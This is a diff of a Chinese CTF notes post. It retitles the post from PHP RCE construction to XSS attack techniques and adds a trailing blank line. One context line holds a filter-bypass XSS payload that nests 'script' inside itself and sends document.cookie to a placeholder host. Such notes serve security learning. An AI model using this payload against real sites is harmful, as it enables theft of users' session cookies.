@@ -1,9 +1,9 @@
 ---
-title: PHP自增RCE构造
+title: XSS跨站脚本攻击部分姿势
 date: 2026-02-07
 category: web
 tags: ["web", "ctf", "基础漏洞"]
-excerpt: 打靶时整理的一些payload
+excerpt: 打靶时自己整理的一些payload
 ---
 
 # XSS
@@ -177,3 +177,4 @@ Connection: close
 
 比如后端把payload中的script删除，这时候可以这样构造
 `<scrscriptipt>location.href="http://ip/get_flag.php?c="+document.cookie</scrscriptipt>`
+
